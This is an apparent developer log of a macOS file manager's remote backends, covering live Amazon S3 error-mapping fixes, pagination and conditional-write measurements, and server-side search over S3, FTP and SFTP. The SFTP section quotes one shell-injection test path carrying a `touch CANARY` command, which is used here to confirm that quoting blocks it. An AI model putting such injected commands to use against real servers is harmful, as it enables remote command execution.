+2026-08-18**: badges, costs and naming verified live for both, and the `.Trash` assumption found not
+to hold for either — OneDrive keeps none, Dropbox keeps one and never uses it, and both send their
+deletes to `~/.Trash` (see the milestone's opening). Neither needed code, and `NotDownloaded` — the
+state OneDrive's pinned account could not produce — was closed on Dropbox the same day, so every
+state `CloudItemAttributes` reports has now been seen live on a third-party provider. **Box followed on
+2026-08-18** and is written up in the opening above, which leaves that half of the milestone closed:
+five providers measured, and the two signals — "declares trashing" and "has a `.Trash`" — exhausted
+without either predicting where a delete lands.
+
+**Follow-up, 2026-08-18 — the first run against real Amazon S3, which found one bug and one bad
+test.** Every earlier slice was verified against a local SigV4-verifying endpoint, anonymous reads of
+public AWS buckets, and one paid S3-compatible account; what none of them could do was be *Amazon,
+writable*. A bucket in `eu-north-1` behind an IAM user's key closes that, and the live suites' config
+file now exists on this Mac. Nine of the eleven live tests passed on the first run, the account suite
+entire — connect with no bucket, enter a bucket, walk back out, and create-and-delete a real one.
+
+- **`encoding-type=url` is `application/x-www-form-urlencoded`, so a space comes back as `+`** — and
+  `S3Key.decodingURLEncoding` was `removingPercentEncoding`, which reads straight past it. Measured
+  by listing the same three keys with the parameter and without: `c d.txt` → `c+d.txt`,
+  `trailing␣` → `trailing+`, and a literal `a+b.txt` → `a%2Bb.txt`. So **every key holding a space
+  was misnamed in the pane**, and since each byte-moving verb re-encodes that name into a URL, where
+  a literal `+` becomes `%2B`, each one addressed an object that is not there: `stat` and F5
+  answering `notFound` for a visible row, F8 reporting success having deleted nothing. A space in a
+  file name is not an edge case. Fixed by substituting before the percent decode, which is
+  unambiguous precisely because a real plus always arrives as `%2B`; +4 tests in a suite of their own
+  over the captured bytes, and the negative control fails exactly those four — the stat one by
+  answering `nil`, which is the user-visible `notFound` verbatim.
+  - **It is Slice 8's trim with the hiding places exchanged**, which is the part worth keeping: that
+    bug was unreachable on AWS (which honors the parameter, so the space arrives as `%20` and there
+    is nothing to trim) and lived on the S3-compatible endpoint; this one is the reverse, since that
+    endpoint **ignores** the parameter and never echoes it, so nothing is decoded there at all, while
+    the public AWS buckets the other fixtures came from have no spaces in any key. Two corpora, one
+    class of bug, and neither corpus can carry both halves — the isolation was worth doing before the
+    fix, and it is one line: the *request* side was fine, `prefix=…%20` matching with `KeyCount 1`.
+- **The other failure was the test, and its constant was a duration written as a byte count.**
+  `S3TransferProgressLiveIntegrationTests` needs a transfer long enough to carry several of `curl`'s
+  once-a-second meter rows; its 4 MiB was fifteen seconds against the ~285 KB/s endpoint it was
+  written for and **2.76 s** against AWS, so the first row landed at 1.82 s and
+  `firstSighting < finished / 2` failed on a transport reporting perfectly. Sizing the probe from a
+  measured rate was tried and is worse — a 1 MiB calibration is mostly handshake and read 2.57 MB/s
+  for a link doing nearer 9, and the two-point slope that removes the fixed cost is dominated by
+  variance: green three runs alone, then one sighting inside the full suite. It now climbs a ladder
+  (4 → 16 → 48 MiB, the top rung deliberately under the 64 MiB multipart threshold, since over it the
+  bytes leave by a different verb), stopping at the first transfer long enough to carry the claim and
+  failing loudly if even the top one is too fast. The assertions moved off fractions and onto the
+  meter's own cadence. Three full-suite runs green with the test's duration varying 3.3–9.2 s and the
+  verdict not; the control — re-silencing the meter with `-sS`, the bug it exists to catch — fails it
+  while the download half keeps passing, which is the narrowness.
+- **What real AWS newly exercised**, beyond finding the above: virtual-host addressing end to end
+  (the S3-compatible endpoint's one-label wildcard certificate had forced path-style on every earlier
+  run, so the default path had never been used against a real service), and the wrong-region `301`
+  carrying `x-amz-bucket-region: eu-north-1` — the header Slice 2 designed the correction around and
+  no endpoint since had sent. Worth noting the `<Endpoint>` element came back **dot**-spelled
+  (`amzn-s3-df.s3.eu-north-1.amazonaws.com`), not the legacy dash form NOTES records; the extractor
+  reads both, so nothing breaks, but the recorded claim was narrower than what AWS sends today.
+- **Still not exercised, and now only for want of arranging it**: a real provider refusing a
+  conditional write (Slice 18/19, above); AWS's `InvalidArgument` on a raw continuation token, which
+  needs more than 1000 keys under one prefix; `BucketAlreadyOwnedByYou`, where the S3-compatible
+  server answered a silent 200; and `InvalidObjectState`, which needs an object in an archive storage
+  class — the one thing on this list that cannot be reached at all on a non-AWS endpoint. *(The last
+  of those closed in the second pass below, and the conditional write in the third; the two token and
+  bucket-naming items are what remain.)*
+
+**Follow-up, 2026-08-18 (second pass) — the four things the first AWS run left open, run and
+fixed.** Two were real bugs, one was a test pinning the wrong thing, and one turned out to be the app
+being right.
+
+- **An archived object was reported as a permissions problem, and the sentence named Full Disk
+  Access.** `PUT` with `x-amz-storage-class: GLACIER` answers 200 and `HEAD` answers **200**, so the
+  row draws with a real size and date and `stat` succeeds — only a `GET` refuses, with **403
+  `InvalidObjectState`**. Every non-credential 403 mapped to `permissionDenied`, whose sentence sends
+  the user to a macOS TCC pane for an object on Amazon's servers. `VFSUnsupportedReason
+  .objectNotRestored(name:)` now names it, translated in all fourteen. Only AWS can produce the
+  state at all — an S3-compatible endpoint refuses every storage class but `STANDARD` — which is why
+  it survived the milestone.
+- **The Full Disk Access sentence was wrong for *every* remote backend, not just for Glacier.**
+  `VFSErrorText.sentence(for:)` took only the error, so an S3 bucket policy, an SFTP mode and an FTP
+  account all recommended a grant that cannot affect a file on a server — true since those backends
+  shipped. `VFSError.permissionDenied` carries the path and the path carries the backend, so the
+  split needed no change to the error type; it had simply never been asked for. This is the widest of
+  the four and the one no S3 work would have found on purpose.
+- **`409 OperationAborted` read as "that name is taken".** S3 answers it while another conditional
+  operation on a bucket name is settling; mapped to `alreadyExists` it sends the user off to choose a
+  different name for a name that is available. `bucketOperationInProgress(name:)` now says to try
+  again shortly. Two measurements bound it and one kills a piece of folklore: a deleted bucket name
+  is **not** held — create/delete/create inside one region succeeds every time — while changing the
+  region between attempts reproduces the refusal on demand and it does not clear in 15 s.
+- **The walk-up "failure" was the test, and the app was right.** With the region deliberately wrong,
+  walking out of a bucket lands on the **corrected** account — a different `VFSBackendID`, listing
+  perfectly — while the test compared against the account as *typed*. It now asserts the
+  relationship (you return to the account that holds the bucket you left, whichever region that
+  turned out to be), which is falsifiable either way and does not assume a correction never fires.
+  It had failed as a 30 s timeout inside a shared helper, i.e. reading as a broken connect.
+
+Both new reasons are pinned in `S3ResponseErrorTests` against the bodies AWS actually sent, each with
+the narrowness control beside it — an ordinary `AccessDenied` still `permissionDenied`, an ordinary
+409 still `alreadyExists` — and the negative control fails exactly the two new tests, showing the old
+mappings verbatim. **Multipart also ran against real AWS for the first time**, in a kept suite of its
+own (`S3MultipartLiveIntegrationTests`): 70 MiB through the real backend, byte-identical by SHA-256,
+~20 s, and no multipart upload left open afterwards. 2526 core tests, 555 app tests, both linters and
+all three CI scripts green.
+
+**Follow-up, 2026-08-18 (third pass) — the conditional write, refused by Amazon. The last item on
+M21's list, and the framing was what had been blocking it.** Slices 17–19 measured everything a
+client can measure alone and parked the rest as "arranging the race against a service that honors the
+precondition"; a race is not what a 412 rests on. The precondition is a **stale tag — a value** — and
+staleness is arrangeable in a straight line: the window in production sits between
+`RemoteFileRevision`'s re-`stat` and the PUT, what it *produces* is an object whose tag is no longer
+the one we hold, and a second sequential write produces exactly that state. The other writer
+collapses into the test. `S3ConditionalWriteLiveIntegrationTests` is the kept suite, four tests, all
+green against the `eu-north-1` bucket, and **AWS honours all of it**:
+
+- **`.changedSince`** — a stale `If-Match` is refused **412 `PreconditionFailed`** with
+  `<Condition>If-Match</Condition>`, and the object is byte-for-byte what it was.
+- **`.goneSince`** — the half `S3WriteCondition.refusal(for:)` called *inferred rather than measured*
+  is now measured: a tag for a key that has since been deleted answers **404**, and the separate
+  sentence is right.
+- **`.alreadyThere`** — an occupied key refuses `If-None-Match: *`. **This one can only be reached
+  one level down, and that is the finding rather than a shortcut**: `createFile` does its own `stat`
+  and throws `alreadyExists` *before* the conditional PUT is ever sent, so the app's own path can
+  never exercise the server's half at all.
+- **The multipart completion** refuses too, publishes nothing, and the abort ran — `?uploads`
+  reported **zero** open uploads afterwards, so the bill this milestone kept naming is closed by
+  measurement rather than by reading the code.
+
+**AWS refuses a completion with the status *and* the code** — probed directly, `HTTP 412` carrying
+`<Code>PreconditionFailed</Code>`. So the 200-committed shape Slice 19 built the body-side reading
+for is still unseen from Amazon: it stays justified (AWS documents the late failure, and the probe
+endpoint reproduces it) and it is honest to record that a status-only reader would have sufficed on
+every real response so far.
+
+**One written claim came back wrong, and it is a correction to NOTES rather than to the code.**
+docs/NOTES.md recorded that stripping an ETag's quotes "turns every conditional write into a 412".
+Measured against Amazon in one run — quoted current tag **200**, *unquoted* current tag **200**,
+unquoted wrong tag **412** — that is true of the probe endpoint, whose 412 semantics are its own
+code, and false of AWS. The rule to keep the quotes stands (a stricter server exists; ours was one),
+but the consequence was over-generalized from the only server that had been asked.
+
+**Two negative controls, each firing on exactly its own half**, which is what makes the pairing more
+than a courtesy: an **unmatchable** tag (a character appended) fails the *control* write with
+`.remoteFileChangedSinceFetch` — i.e. without the pairing, a build whose tags AWS can never match
+reports "somebody else changed this file" on every save while the refusal test stays green, the quiet
+direction — and `.unconditional` in place of the stale condition fails the three refusal assertions
+(the write lands, the tag moves) while the control half keeps passing. 2526 core tests, **559** app
+tests, both linters green.
+
+**Follow-up, 2026-08-18 (fourth pass) — the last two items, and the first of them was recorded
+wrongly.** Both were filed as "only AWS can say": the page loop's continuation token, and
+`BucketAlreadyOwnedByYou`, where the S3-compatible server answers a silent 200. Both are now
+measured against the `eu-north-1` bucket and kept as live tests — `S3PaginationLiveIntegrationTests`
+(new) and one more in `S3AccountLiveIntegrationTests`. 2526 core / **562** app tests, both linters
+and all three check scripts green.
+
+- **The raw token is refused as `403 SignatureDoesNotMatch`, not `400 InvalidArgument`**, and that
+  correction is the pass's main finding, because the two failures send the user to opposite places.
+  `InvalidArgument` ("The continuation token provided is incorrect") is real and is what a
+  *correctly encoded but corrupt* token earns; a **raw** one makes `curl`'s signature and the
+  service's re-derivation disagree, so a **pagination** bug arrives wearing the sentence for a bad
+  key. docs/NOTES.md carried the wrong half since Slice 1 and Slice 8 recorded it as a *difference*
+  between AWS and the S3-compatible endpoint — there is no difference; both answer the same 403.
+- **The character that matters is `+`, and a raw `/` is harmless** (isolated in one run, with `=`
+  refused too). So the intermittency this project kept calling "sometimes" has a rate: 40 tokens
+  sampled at the shipped page size were 65 characters with no padding and **22 carried `+`**, and
+  with the encoder deliberately reverted a 1005-object folder listed correctly in **3 of 6** runs
+  seconds apart, answering `VFSError.permissionDenied` — a *credentials* sentence — in the other
+  three. Every token is minted per request (40 requests at one page boundary, 40 distinct tokens),
+  so a retry genuinely re-rolls it and nothing can pin a token's value.
+- **The app's own listing pages correctly against Amazon**: 1005 objects created under one prefix,
+  listed through the real `S3Backend` and `S3CurlTransport` in **0.58 s** with no row lost or
+  repeated. That was the probe; the *kept* test is cheap instead, because
+  `S3CurlTransport.pageSize` makes the loop reachable over five objects — the "a constant nothing
+  hits makes its own rule untestable" fork docs/NOTES.md records for M22's result cap, settled the
+  same way. A small page also makes the control **deterministic**: at two keys AWS's tokens always
+  end `==`, where at a thousand it is a coin toss.
+- **`BucketAlreadyOwnedByYou` is a 409**, and its body matches the fixture `S3ResponseErrorTests`
+  had been using from the documentation, so the mapping needed nothing. What the pass changed is the
+  *test*: the obvious assertion — the second `createDirectory` throws `alreadyExists` — passes with
+  the local existence check **deleted**, since AWS's 409 maps to the same error. Only a count of
+  requests separates "the app refused without asking" from "the service refused", so the transport
+  counts its own calls. `throws` is not evidence, for the third time in this milestone.
+- **A real provider's `BucketAlreadyExists` stays unreachable**, and for a reason worth recording:
+  a properly scoped key is refused by its own IAM policy (`403 AccessDenied` on `s3:CreateBucket`)
+  before the service ever weighs the name. The same policy is why AWS's documented `us-east-1`
+  legacy quirk — a re-create answering 200 there — could not be exercised either.
+
+**And the pass found a live-suite hazard whose symptom is a ten-minute timeout.** Twice, a full
+`xcodebuild test` never finished; sampling the hung process named it exactly —
+`leavesABucket` → `enterS3Bucket` → `presentOperationFailure` → `-[NSAlert runModal]`, with thirteen
+unrelated tests pending behind it. That alert is one the M21 audit deliberately **kept** its
+`runModal` fallback on (a user pressed Enter on that row, so a detached alert beats no answer), so
+the app is right and the suite was wrong: every gesture there is a real network call that can fail,
+and a window-less pane turns any such failure into a parked test host. The panes now live in an
+(unordered, never-visible) `NSWindow`, which makes the same alert a sheet — measured both ways with
+a throwaway test that raises one directly: 0.3 s and the suite green with the window, wedged in
+`runModal` without it. Same class as the six dialogs `RenameReachTests` cost a session, arriving on
+the *other* kind of alert — the kind whose fallback is correct and must stay.
+
+**Follow-up, 2026-08-19 — the two refusals a scoped key cannot reach, reached.** Both were left as
+stated limits the day before: IAM is evaluated *before* the name registry, so a key scoped to its own
+buckets is refused `403 AccessDenied` for a name somebody else owns and never learns it was taken
+(measured on `images`, `test` and `backup`, and on our own data bucket — the policy answers first
+even there). Two deliberately narrow grants make both reachable, and one of them turned out to be a
+wrong sentence rather than a missing measurement. 2527 core / **563** app tests, both linters and all
+three check scripts green; +1 string in all 14 catalogs.
+
+- **`BucketAlreadyExists` is a 409, and `alreadyExists` was the wrong answer to it.** AWS says *"The
+  requested bucket name is not available. The bucket namespace is shared by all users of the
+  system."* — and the shared 409 mapping rendered that as **"An item with that name already exists
+  here."**, in a pane listing the account's own buckets, where the name is absent and cannot be put
+  there. So the user looks, does not find it, and tries again. `VFSUnsupportedReason
+  .bucketNameTakenGlobally(name:)` now carries the fact the pane cannot show — the namespace is
+  S3-wide — translated in all fourteen. **Two of this verb's three named refusals are 409s**, which
+  is the shape worth remembering: one status has meant "taken", "settling" and "taken by a stranger",
+  and only the `<Code>` separates them.
+- **The `us-east-1` legacy 200 is real**, and it is what retires the last doubt about Slice 9's local
+  existence check. Creating a bucket this account already owns answers **`200` with an empty body**
+  there — three times, stable — where the same request in `eu-north-1` answers `409
+  BucketAlreadyOwnedByYou`. That is the S3-compatible endpoint's "silent 200" *on Amazon*, so the
+  check is not a workaround for one lenient server: without it, F7 on an existing bucket in the
+  most-used region would report success and do nothing. Deliberately **not** kept as a test — it
+  needs a second bucket name and a cross-region create/delete cycle, which is exactly what the second
+  pass measured as provoking `409 OperationAborted` that does not clear quickly. The check itself is
+  pinned by the request-count test instead.
+- The grant for the first is inert by construction (`s3:CreateBucket` on `arn:aws:s3:::images`, a
+  name nothing can ever create), so `globallyTakenBucketNameIsRefused` is kept live; its failure
+  message names the grant, because that constant is a claim about the **key** rather than about the
+  service.
+
+**With this, M21's list is empty.**
+
+### M22 — Find Files on a connected server (M)
+
+Opened 2026-08-16 and closed the same day; all five slices plus the FTP/FTPS verification
+pass landed 2026-08-16. M21, which sits between the two, was still open when this was archived; it
+closed 2026-08-19 and is the section above.
+
+⌥F7 has been Spotlight since M4, so it answers for this Mac and for nothing else: connect a bucket
+or a server and the one gesture for "where is that file" stops existing. The ask is to make it work
+on S3, FTP/FTPS and SFTP.
+
+**Most of the feature is already there, and it is the half that looks hardest.** A results tab's
+*container* path is synthetic while every entry in it carries its real `VFSPath`
+(`PanelViewController+Results`), and `CompositeBackend` routes per entry — so F5, ⌘Y, the path bar
+and Quick View reach an `s3://` hit exactly as they reach a local one, with no work. What is
+Spotlight-bound is two links of the chain: `FileQuery.metadataPredicate()` (the type was
+called `SpotlightQuery` until this milestone) and
+`SpotlightSearchRunner`. One consequence worth having early: a remote search needs **no per-hit
+`stat`**. That call exists because `mdfind` hands back bare strings; a walk gets whole `FileEntry`s
+out of the listing it has already paid for.
+
+#### The query and the index are two things wearing one name
+
+`FileQuery` describes what the user wants *and* renders it into `kMDItem…`. The milestone
+splits those: the same value gains a pure `matches(_ entry:)`, so one query drives both routes and
+there is one definition of what "Images larger than 1 MB" means. The route is picked by the scope's
+backend — `.local` keeps Spotlight, anything re-listable and not on this disk takes a walk.
+
+**Which fields a backend can answer is one named thing, not a check per site**
+(`SearchFields.answerable(by:)`). The dialog hides what is not in the set; the matcher applies only
+what is in it. That is what makes the hazard catchable: a saved search made locally carries
+`contentContains`, and a matcher that quietly skips a clause it cannot answer returns **more**
+results under the same name — the quiet direction, and the reason this is a capability set rather
+than four `if` statements.
+
+Content and tags are gone remotely, as asked. Two more needed deciding and are *kept*:
+
+- **Kind stays, and changes meaning.** Remotely it can only be derived from the **name**
+  (`UTType(filenameExtension:)`), not from content — but it asks the identical conformance question
+  against the identical `SearchKind.contentType`, so the two routes share one definition and diverge
+  only in what they look at. "Every image under this prefix" is most of what anyone wants from a
+  bucket, and it costs no request.
+- **Modified and Size stay, and never match a row that cannot answer.** An S3 folder is a common
+  prefix with **no date at all** (`FileEntry.unknownDate`), and a directory's size is not measured
+  on any of the three. So a size or date filter is a question about *files*: a row with no such
+  attribute does not match, rather than matching vacuously. It diverges from Spotlight, which does
+  answer for folders, and that is stated rather than discovered.
+
+#### Three backends, three different costs
+
+- **S3 is nearly free and needs no walk.** `ListObjectsV2` with **no delimiter** returns every key
+  at every depth — the enumeration `S3Backend.removeItem` already uses for a recursive delete — so a
+  whole-bucket name search is one request per **1000 keys**, not one per directory. A backend that
+  can answer a subtree in fewer requests than a walk would take says so through one optional seam
+  (`subtreeListing(at:)`, defaulting to `nil`); everything else walks.
+- **FTP/FTPS is a client walk**, one round trip per directory, and its cost model is already
+  measured and written down: `DirectorySizeBudget` — 0.62 s per listing, a 1000-directory remote
+  ceiling, `abandonsWhenUnwatched`. Search reuses that type rather than minting a second policy.
+  Note FTP's stamps are year-less, zone-less and on the server's clock (`hasCoarseModificationTimes`)
+  — fine for a "past week" filter, which is all this asks of them.
+- **SFTP goes server-side**, decided at open: `ssh <host> find <path> …` answers the whole tree in
+  one round trip where the walk pays one per directory. It is the one part of this milestone that
+  needs a probe before any Swift, and it has two failure modes that must degrade rather than
+  surface — an account restricted to the `sftp` subsystem (no exec channel at all) and a server
+  whose `find` is not GNU's. The walk is the fallback, so the feature never depends on the probe's
+  answer, only its speed does.
+  - **The probe retired the second failure mode rather than handling it** (2026-08-16, taken by the
+    user on a recommendation). `find -printf` is GNU-only, and there is no Linux host and no GNU
+    coreutils on this Mac, so choosing it would have shipped the *common* case unverified while the
+    only server available exercised the fallback. `find <root> -exec ls -ldn {} +` is POSIX on both
+    halves, prints the `ls -l` row `ColumnarListing.unixRow` already reads for `sftp` and FTP, and
+    was measured end to end here. What it costs is the date column — year-less, zone-less, on the
+    server's clock — which is the compromise this milestone had already accepted for FTP.
+
+A **search over an S3 account pane is refused**: its rows are buckets, and "search every bucket" is
+a different and much more expensive question than the one ⌥F7 asks. Scope must be a bucket or a
+folder in one.
+
+Something the walk gets for free and Spotlight does not: an **archive** is re-listable out of a
+cached `bsdtar -tvf` on this disk, so "find in this zip" is the same code with an unbounded budget.
+In scope for the capability table from Slice 1; wired last.
+
+**The walk is breadth-first, unlike `DirectorySizer`'s stack**, and it matters at exactly the moment
+it is bounded: a depth-first search that runs out of budget returns a deep sliver of one branch,
+where breadth-first returns everything near the top — which is where a person's file usually is. It
+also returns its partial hits instead of throwing, which is the opposite of what the sizer does with
+a partial total, and for a stated reason: a partial *total* is a claim about the folder, while
+partial *hits* really do match and the truncation is a fact about the question. That is what
+`SpotlightSearchRunner`'s existing 5000-row cap already reports.
+
+**Verification is the constraint.** There is no live FTP, FTPS, SFTP or S3 account available for
+this milestone, so "probe the real thing" cannot be satisfied the way M21's was. The honest
+substitute is the instrument M13 and M21 already used and NOTES already documents — `pyftpdlib` with
+two self-signed certificates for FTP/FTPS, a SigV4-verifying local endpoint for S3, and this Mac's
+own Remote Login for SFTP (which needs the user to switch it on). Anything that cannot be measured
+that way is stated as unmeasured rather than assumed.
+
+Slices, core first: **(1)** `SearchFields`, `SearchPredicate`, `SubtreeSearch` — pure, tested, app
+untouched. **(2)** the app routes ⌥F7 by backend and the dialog hides the fields the scope cannot
+answer. **(3)** S3's flat enumeration behind `subtreeListing`. **(4)** SFTP's server-side `find`,
+after its probe, with the walk as fallback. **(5)** archives, and saved searches carrying a remote
+scope.
+
+**Slice 1 landed 2026-08-16**, core-only and additive: `SearchFields` (what a place can answer, plus
+`SearchRoute`), `SearchPredicate` (the query compiled to a per-entry test), `SubtreeSearch` (the
+breadth-first bounded walk), and one optional seam on `VFSBackend` — `subtreeListing(at:isCancelled:)`,
+defaulting to `nil`, so a backend whose keyspace is flat can answer a whole subtree in one call. +29
+core tests (2427 core / 508 app green, both linters clean); the only edit to existing code is three
+`private` computed properties on `FileQuery` widened to internal, since Swift's `private` does
+not cross files.
+
+Two negative controls, both of which fired and one of which measured the design rather than merely
+guarding it:
+
+- **Depth-first instead of breadth-first** failed exactly the two order-dependent tests and left the
+  other eleven green — which is what says they measure different things. It also put a number on the
+  argument: over the same fixture with a 2-directory budget, the depth-first version dived into
+  `/root/b` and returned **one** hit where breadth-first returned two, having covered the shallow
+  tree. That is the "deep sliver of one branch" claim, reproduced.
+- **Dropping the unanswerable-clause refusal** compiled a tags-only query into a predicate with
+  *every field nil* — one that matches every row it is shown. So the hazard the type exists to
+  prevent is not theoretical: without it, a saved search re-run on a server lists the entire subtree
+  under the name of a search that means something much narrower.
+
+**Slice 2 landed 2026-08-16** — the app: ⌥F7 routes by the scope's backend, and the dialog hides
+what the scope cannot answer. `SubtreeSearchRunner` (the walk off the main thread, with a
+latest-value `SearchControl` rather than a progress callback, because a coalescer that drops what it
+withholds latches — docs/NOTES.md), `SearchProgressSheet` (late by 400 ms, live counts, Stop),
+`PanelViewController+SearchWalk` (the three completions, two surfaces: an alert for a limit the user
+ran into, the status line for a stop they chose), and `SearchFilterOptions` split out of a
+`SearchController` that had gone past `type_body_length`. `canFindFiles` gates both the key and the
+menu item, so an **S3 account pane** offers no search rather than quietly searching this Mac's home
+folder. 11 new strings, translated into all 13 languages — two of them reworded to labelled counts
+(`Folders searched: %lld · Found: %lld`) so nothing needs plural agreement on two numbers in
+fourteen languages for a line that is on screen for seconds. +9 app tests (2429 core / 517 app
+green, both linters and all three scripts clean).
+
+`SubtreeSearch` gained a fourth completion in the same pass, and it is a correction to Slice 1 rather
+than an addition: a stopped walk **returns its hits** instead of throwing `CancellationError`. Stop
+here means "that's enough, show me what you have" — a person is standing at the button — where a
+cancelled *size* walk has nothing honest to report. The flat shortcut cannot return partway through,
+so it says the same thing by throwing, which `find` converts, and the two routes are
+indistinguishable to the caller.
+
+**Verified live against an archive**, which is the one walking backend reachable with no server: a
+zip four levels deep, searched from its root (4 hits at every depth) and from `docs/` (3, the root's
+own hit correctly excluded), with "All of “pkg.zip”" from inside `docs/` finding all 4 again. The
+dialog drew **Name / Kind / Size / Modified / Search in** and no Content or Tags row.
+
+That run found the one thing nothing else could have: **F5 on a hit failed inside the queue** —
+"This location doesn't support copying files". `copyToOtherPane` asked the *pane* whether it was an
+archive, and a results tab's container is the synthetic `search:` path, so the extraction route never
+ran and the byte copy reached `ArchiveBackend`, which has no `copyFile`. The question has to be asked
+of the **rows** (`extractionArchivePath(for:)`), which is this project's most-repeated finding
+arriving through a new door: a second source of entries reached a site that decides by backend. F6 is
+gated the same way, in the flow *and* in its validator. Re-verified live: `report-top.txt` extracted
+out of the archive and landed in the destination pane. Fixed rather than deferred because the slice
+is what made it reachable; four tests pin it, including the narrowness control that an ordinary local
+results tab still takes the copy path.
+
+**Slice 3 landed 2026-08-16** — S3 answers a whole subtree in one enumeration.
+`S3Backend.subtreeListing` (`S3Backend+Subtree.swift`) fills the Slice 1 seam with a
+delimiter-less `ListObjectsV2`, and `S3SubtreeListing` turns those flat keys into the rows a walk
+would have produced. Two things in that conversion are decisions rather than plumbing, and both are
+what the tests are really about:
+
+- **Folders are synthesized, because with no delimiter the server sends none.** The pages carry
+  `docs/`, `docs/report.pdf` and `docs/sub/notes.txt` and not one `<CommonPrefixes>` — the same
+  measured fact the recursive delete already rests on — so rendering only the objects would mean a
+  search for `docs` finds nothing called `docs`, and a Kind filter of *Folders* returns an empty
+  result over a bucket full of them. An empty result reads as "there is none", which is the quiet
+  direction. Every component on the way down to a key therefore names a folder, emitted once; a
+  trailing-slash marker names one too, which is the only trace an **empty** folder leaves in a flat
+  store.
+- **Rows come out shallowest-first.** S3 returns keys lexicographically, so truncating that order
+  keeps a deep branch under `a/` ahead of everything under `z/` — the "deep sliver" this milestone
+  argued against when it chose breadth-first for the walk. Ordering by depth is what makes the two
+  routes agree at the moment the 5000-row cap bites, rather than differing on a property of the
+  *store* that nobody chose.
+
+The app's `CompositeBackend` had to **forward** the seam, and that is the finding worth keeping: the
+protocol's default is `nil` — "no shortcut, walk instead" — so a composite that never mentions it
+compiles, returns the same rows, and quietly bills one request per folder. There is no symptom on
+screen. Two other one-rule-two-spellings cleanups came with it: the pagination loop and its two
+guards now live once (`S3Backend+Pages.swift`) rather than in three copies whose comments said "the
+same reason `listDirectory` does", and `S3ListingParser`'s row builder is shared, so the flat route
+cannot render an object differently from the listing route.
+
++15 core, +2 app (2444 core / 519 app green, both linters and all three scripts clean). Three
+negative controls, each firing on a different set: dropping folder synthesis failed 9 tests and left
+the file-only ones green; returning arrival order instead of depth order failed exactly the 4
+order-dependent ones; and removing the composite's forward failed the routing test while its
+narrowness control (a local path still reports `nil`) kept passing.
+
+**Verified live against a local endpoint**, since there is still no account to probe: a Python
+`ListObjectsV2` server on `127.0.0.1`, plus a throwaway SwiftPM harness compiling the app's *real*
+`S3CurlTransport` against the real core, so every byte came off a socket through real `curl`. Six
+searches, six single-request enumerations, with the server's own log as the witness — and re-run
+with the page size forced to **two keys** it produced byte-identical output across four pages, which
+is the cross-page folder dedupe and the continuation-token round trip measured rather than argued.
+Then the app itself, connected to that endpoint: the Find Files dialog drew Name / Kind / Size /
+Modified and no Content or Tags row, ⌥F7 for `o` returned six hits spanning three depths —
+`notes.txt` three levels down, and the folders `docs` and `photos` that exist in that bucket only as
+prefixes — and the log shows the search spending **delimiter-less pages only**, with no per-folder
+listing of the four folders a walk would have had to visit.
+
+**Slice 4 landed 2026-08-16** — SFTP borrows the server's own `find` over an SSH exec channel.
+`SSHFindCommand` builds the one remote command, `SSHFindListingParser` reads it back, and
+`SFTPBackend+Subtree` fills the Slice 1 seam with them; `SFTPTransport` gains `runCommand`, whose
+default answers `nil` so every existing transport and test double inherits "no shortcut, walk". The
+seam's return type changed from `[FileEntry]?` to `VFSSubtreeListing`, carrying `isComplete` —
+S3 pages until the bucket is exhausted and is always complete, while this command's output is capped
+on the server, and a shortcut that could not report being cut off would answer "here is everything"
+about a slice of a tree.
+
+**The probe came first and decided four things, none of them guessable.** Measured against a real
+`sshd` (Remote Login is off on this Mac, so the instrument is a non-root `sshd` on port 2222, with a
+second on 2223 carrying `ForceCommand internal-sftp`):
+
+- **The saving is the connection, not the walk.** Over 501 directories on *loopback*, where there is
+  no latency to blame: one exec **98 ms**, against **34.3 s** as separate `sftp` connections
+  (68.5 ms each) — the shipped walk opens a full TCP connect, SSH handshake and authentication per
+  directory. On any real network the gap only widens, since a handshake is several round trips.
+- **Neither the exit status nor the stream tells you whether the command ran**, which inverts the
+  natural design. An `sftp`-only account answers an exec request with prose on **stdout**, exit 1,
+  empty stderr; `find` answers exit 1 **with correct rows** when one subdirectory is unreadable. So
+  the transport classifies nothing, and the *parser* decides — `find` echoes the operand it was
+  given, so the root's own row is the sentinel, and its absence is what means "walk instead". An
+  empty folder still prints that row, which is precisely the case the two answers must be told apart
+  on.
+- **An exec channel runs the user's login shell and sources their rc**, so a `find` shell *function*
+  shadows the binary — probed, one printed `SHADOWED` where the real `find` would have listed.
+  `/usr/bin/env` bypasses it. Only the words the shell resolves need that; the `ls` inside `-exec` is
+  spawned by `find` itself and is out of reach.
+- **A remote path reaches a shell, so quoting is a security boundary rather than formatting.** POSIX
+  single-quoting held against a crafted `…/tree'; touch CANARY; echo '` (no canary; `find` reported
+  the whole string as one missing path), and a directory genuinely named ``it's $a `b` ;x.txt`` came
+  back byte-for-byte.
+
+Rows come out **shallowest-first**, as S3's do and for the same reason: `find` walks depth-first, so
+its own order would put a whole deep branch ahead of a file at the top when the result cap bites.
+
++27 core (2471) and +2 app (523) tests, both linters and all three scripts clean. **Seven negative
+controls, and the seventh is the one worth recording**: dropping depth ordering, the root sentinel,
+the path anchor, `env`, `ssh`'s `-p`, and the truncated-beats-budgetExceeded tie each failed exactly
+the tests naming them — while *claiming a capped run was complete* failed **nothing**, because the
+row cap was unreachable at 50 000 rows. That is a rule nobody had watched fail; `subtreeRowLimit`
+became settable so a test can reach it, and the control then fired on one test alone.
+
+**Verified live, twice, with the server's own log as the witness.** The real app connected to the
+exec-capable account, ⌥F7 over a four-level tree returned 5 hits spanning three depths and the log
+shows **one** `Starting session: command`. The same search against the `sftp`-only account returned
+**the identical 5 hits** and the log shows **six** `forced-command 'internal-sftp'` sessions — one
+refused exec attempt, then five directory listings. The degrade is invisible to the user, which is
+what it was designed to be.
+
+Two things the slice deliberately did **not** ship, both recorded because they are the next thing
+someone will reach for:
+
+- **A memo of accounts that refused exec.** Written, then removed on the measurement: it cannot fire
+  for the case it exists for (the refusal *looks* like an answer from the transport's side, so only
+  the core could feed it), and it would save exactly one handshake in front of a walk about to spend
+  one per directory.
+- **Batching the walk itself.** The same benchmark measured **one** `sftp` session carrying all 501
+  `ls` commands at **239 ms** — 140× faster than the shipped walk, on every account including
+  locked-down ones, with no exec channel needed. It is a change to `SFTPTransport.listDirectory`,
+  which every browse and every file operation goes through, so it is a milestone of its own rather
+  than a passenger in a search slice.
+
+**Slice 5 landed 2026-08-16** — saved searches, and the archive half, which turned out to be
+mostly *undoing this milestone's own opening premise*.
+
+Archives needed no wiring at all: Slice 2 keyed the route on `isArchive` rather than enumerating
+backends, so the walk, the unbounded budget and the dialog's hidden rows all arrived with it and
+were verified live that day. What was left was the **saved search**, and one whole class of bug
